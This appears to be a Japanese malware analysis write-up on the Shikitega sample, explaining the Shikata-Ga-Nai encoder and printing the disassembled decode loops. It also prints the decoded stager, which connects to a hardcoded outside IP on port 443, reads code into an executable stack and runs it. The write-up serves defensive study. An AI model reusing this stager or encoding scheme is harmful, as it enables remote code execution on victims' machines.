# Shikata-Ga-Nai(Zutto_Dekiru)
## Sample Malware
- malware : shikitega
- MD5 hash : d1cd3293ac4b312e0b3218e80376bd88
- entry point : 0x8048054
- file size : 431 byte
- URL : [shikitega](https://bazaar.abuse.ch/sample/0233dcf6417ab33b48e7b54878893800d268b9b6e5ca6ad852693174226e3bed/)
## Reference page
- URL1 : [MANDIANT](https://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-going-strong)
- URL2 : [Decode Shikata-Ga-Nai with binary ninja](https://medium.com/@acheron2302/writing-binary-ninja-plugin-to-decode-shikata-ga-nai-part-1-df8ceda67fd7)
## Shikata-Ga-Nai Features
- FPU命令を使用してアドレスを算出
- 初期化フェーズについては、特別な実行順序はないが、以下の動作を行う。
1. キーを初期化しレジスタに保存
1. FPU命令を使用しEIPを取得
1. デコードする必要があるdwordの数のカウンタを取得
1. （場合によっては開始位置が+4だけずれることもある）
- ```fnstenv```命令は、直前に実行されたFPU命令のアドレスを```[esp-0xc]```に格納する。（[参考ページ](https://inaz2.hatenablog.com/entry/2014/07/15/023104)）
```
$ objdump -M intel -d a.out 
00001000 <_start>:
    1000:	d9 d0                	fnop   
    1002:	d9 74 24 f4          	fnstenv [esp-0xc]
    1006:	58                   	pop    eax
    1007:	cc                   	int3   
sansforensics@siftworkstation: ~
$ gdb ./a.out 
(gdb) r
Starting program: /home/sansforensics/a.out 

Program received signal SIGTRAP, Trace/breakpoint trap.
0x56556008 in ?? ()
(gdb) disas _start
Dump of assembler code for function _start:
   0x56556000 <+0>:	fnop   
   0x56556002 <+2>:	fnstenv -0xc(%esp)
   0x56556006 <+6>:	pop    %eax
   0x56556007 <+7>:	int3   
End of assembler dump.
(gdb) i r eax
eax            0x56556000          1448435712
```
- 排他的論理和を使用してペイロードを復号する。
## Analyze Shikata-Ga-Nai encoded malware
- ```Shikata-Ga-Nai```によてエンコードされたマルウェアの初期動作
```
   0x08048054:	mov    edx,0xa7bc0447
   0x08048059:	fcmove st,st(4)                    ;FPU instruction for geting eip
   0x0804805b:	fnstenv [esp-0xc]                  ;Get eip
   0x0804805f:	pop    eax
   0x08048060:	sub    ecx,ecx
   0x08048062:	mov    cl,0x51                     ;count=0x51
   0x08048064:	xor    DWORD PTR [eax+0x12],edx
   0x08048067:	add    eax,0x4
   0x0804806a:	add    edx,DWORD PTR [edi]
   0x0804806c:	or     bl,BYTE PTR [esi+0x52]
   0x0804806f:	sub    BYTE PTR ds:0x915df5ac,ah
```
### Deployment
- Algolithm : xor SomeVals
- SomeVals : 今回は初期値に排他的論理和を実行した自身の値を加算したのちにデコードを行っている。
```
   0x8048064:	xor    DWORD PTR [eax+0x12],edx
   0x8048067:	add    eax,0x4
   0x804806a:	add    edx,DWORD PTR [eax+0xe]
```
- target address : 0x804806b
- termina addrsee : 0x80481ab
- ```0x0804807f```のdestinationが```DWORD PTR [esi+0x13]```になっている場合はデコードに失敗している。
- 以降複計７回のデコードが発生する
- after deployment
```
   0x08048054:	mov    edx,0xa7bc0447
   0x08048059:	fcmove st,st(4)
   0x0804805b:	fnstenv [esp-0xc]
   0x0804805f:	pop    eax
   0x08048060:	sub    ecx,ecx
   0x08048062:	mov    cl,0x51
   0x08048064:	xor    DWORD PTR [eax+0x12],edx         ; initial value 0xa7bc0447
   0x08048067:	add    eax,0x4
   0x0804806a:	add    edx,DWORD PTR [eax+0xe]
   0x0804806d:	loop   0x8048064                        ; fist decode loop
   0x0804806f:	mov    edi,0xb683237
   0x08048074:	fcmovnb st,st(3)
   0x08048076:	fnstenv [esp-0xc]
   0x0804807a:	pop    eax
   0x0804807b:	xor    ecx,ecx
   0x0804807d:	mov    cl,0x4a
   0x0804807f:	xor    DWORD PTR [eax+0x13],edi          ; initial value 0xb683237
   0x08048082:	sub    eax,0xfffffffc
   0x08048085:	add    edi,DWORD PTR [eax+0xf]
   0x08048088:	loop   0x804807f                         ; second decode loop
   0x0804808a:	fcmovne st,st(3)
   0x0804808c:	mov    edx,0x6af194e5
   0x08048091:	fnstenv [esp-0xc]
   0x08048095:	pop    ebp
   0x08048096:	xor    ecx,ecx
   0x08048098:	mov    cl,0x43
   0x0804809a:	xor    DWORD PTR [ebp+0x19],edx           ; initial value 0x6af194e5
   0x0804809d:	add    edx,DWORD PTR [ebp+0x19]
   0x080480a0:	sub    ebp,0xfffffffc
   0x080480a3:	loop   0x804809a                          ; third deocde loop  
   0x080480a5:	mov    eax,0x1068a5e8
   0x080480aa:	fcmovne st,st(7)
   0x080480ac:	fnstenv [esp-0xc]
   0x080480b0:	pop    ebx
   0x080480b1:	xor    ecx,ecx
   0x080480b3:	mov    cl,0x3c
   0x080480b5:	add    ebx,0x4
   0x080480b8:	xor    DWORD PTR [ebx+0x11],eax             ; initial value 0x1068a5e8
   0x080480bb:	add    eax,DWORD PTR [ebx+0x11]
   0x080480be:	loop   0x80480b5                            ; 4th deocde loop
   0x080480c0:	mov    edx,0xfd3089b0
   0x080480c5:	fcmovnb st,st(4)
   0x080480c7:	fnstenv [esp-0xc]
   0x080480cb:	pop    esi
   0x080480cc:	sub    ecx,ecx
   0x080480ce:	mov    cl,0x36
   0x080480d0:	add    esi,0x4
   0x080480d3:	xor    DWORD PTR [esi+0xe],edx              ; initial value 0xfd3089b0
   0x080480d6:	add    edx,DWORD PTR [esi+0xe]
   0x080480d9:	loop   0x80480d0                            ; 5th decode
   0x080480db:	mov    esi,0x35c3c885
   0x080480e0:	fincstp 
   0x080480e2:	fnstenv [esp-0xc]
   0x080480e6:	pop    edx
   0x080480e7:	xor    ecx,ecx
   0x080480e9:	mov    cl,0x2f
   0x080480eb:	xor    DWORD PTR [edx+0x13],esi             ; initial value 0x35c3c885
   0x080480ee:	add    esi,DWORD PTR [edx+0x13]
   0x080480f1:	sub    edx,0xfffffffc
   0x080480f4:	loop   0x80480eb                            ; 6th decode loop
   0x080480f6:	mov    eax,0x59a96d9c
   0x080480fb:	fcmovnbe st,st(5)
   0x080480fd:	fnstenv [esp-0xc]
   0x08048101:	pop    ebp
   0x08048102:	xor    ecx,ecx
   0x08048104:	mov    cl,0x28
   0x08048104:	mov    cl,0x28
   0x08048106:	add    ebp,0x4
   0x08048109:	xor    DWORD PTR [ebp+0x10],eax                 ; initial value 0x59a96d9c
   0x0804810c:	add    eax,DWORD PTR [ebp+0x10]
   0x0804810f:	loop   0x8048106                                ; 7th decode loop
   0x08048111:	push   0x2
   0x08048113:	pop    eax
   0x08048114:	int    0x80                                      ; systemcall 0x2 (fork)
   0x08048116:	test   eax,eax
+--0x08048118:	je     0x8048120
|+>0x0804811a:	xor    eax,eax
|| 0x0804811c:	mov    al,0x1
|| 0x0804811e:	int    0x80                                      ; systemcall 0x1 (exit)
+->0x08048120:	mov    al,0x42
 | 0x08048122:	int    0x80                                      ; systemcall 0x42 (setsid)
 | 0x08048124:	push   0x2
 | 0x08048126:	pop    eax
 | 0x08048127:	int    0x80                                      ; systemcall 0x2 (fork)
 | 0x08048129:	test   eax,eax
 +-0x0804812b:	jne    0x804811a
   0x0804812d:	push   0xa
   0x0804812f:	pop    esi
  +0x08048130:	xor    ebx,ebx
  |0x08048132:	mul    ebx
  |0x08048134:	push   ebx
  |0x08048135:	inc    ebx
  |0x08048136:	push   ebx
  |0x08048137:	push   0x2
  |0x08048139:	mov    al,0x66
  |0x0804813b:	mov    ecx,esp
  |0x0804813d:	int    0x80                                     ; systemcall 0x66 ( socketcall(SYS_SOCKET,AF_INET) )
  |0x0804813f:	xchg   edi,eax
  |0x08048140:	pop    ebx
  |0x08048141:	push   0x71365f8d
  |0x08048146:	push   0xbb010002
  |0x0804814b:	mov    ecx,esp
  |0x0804814d:	push   0x66
  |0x0804814f:	pop    eax
  |0x08048150:	push   eax
  |0x08048151:	push   ecx
  |0x08048152:	push   edi
  |0x08048153:	mov    ecx,esp
  |0x08048155:	inc    ebx
  |0x08048156:	int    0x80                                     ;systemcall 0x66 ( socketcall(SYS_CONNECT,0x3) )
  |0x08048158:	test   eax,eax
+--0x0804815a:	jns    0x8048175
| |0x0804815c:	dec    esi
|+-0x0804815d:	je     0x804819c
|||0x0804815f:	push   0xa2
|||0x08048164:	pop    eax
|||0x08048165:	push   0x0
|||0x08048167:	push   0x5
|||0x08048169:	mov    ebx,esp
|||0x0804816b:	xor    ecx,ecx
|||0x0804816d:	int    0x80                                     ; systemcall 0xa2 (nanosleep)
|||0x0804816f:	test   eax,eax
||+0x08048171:	jns    0x8048130
|+-0x08048173:	jmp    0x804819c
+->0x08048175:	mov    dl,0x7
 | 0x08048177:	mov    ecx,0x1000
 | 0x0804817c:	mov    ebx,esp
 | 0x0804817e:	shr    ebx,0xc
 | 0x08048181:	shl    ebx,0xc
 | 0x08048184:	mov    al,0x7d
 | 0x08048186:	int    0x80                                     ; systemcall
 | 0x08048188:	test   eax,eax
 | 0x0804818a:	js     0x804819c
 | 0x0804818c:	pop    ebx
 | 0x0804818d:	mov    ecx,esp
 | 0x0804818f:	cdq    
 | 0x08048190:	mov    dl,0x6a
 | 0x08048192:	mov    al,0x3
 | 0x08048194:	int    0x80                                     ; systemcall
 | 0x08048196:	test   eax,eax
 | 0x08048198:	js     0x804819c
 | 0x0804819a:	jmp    ecx
 +-0x0804819c:	mov    eax,0x1
   0x080481a1:	mov    ebx,0x1
   0x080481a6:	int    0x80                                     ; systemcall
   0x080481a8:	xor    ebx,ebx
   0x080481aa:	push   0x1
   0x080481ac:	pop    eax
   0x080481ad:	int    0x80                                     ; systemcall 0x1 (exit)
```
## その他のアイディア
```Shikata-Ga-Nai```エンコーダの背景知識
### FPU命令
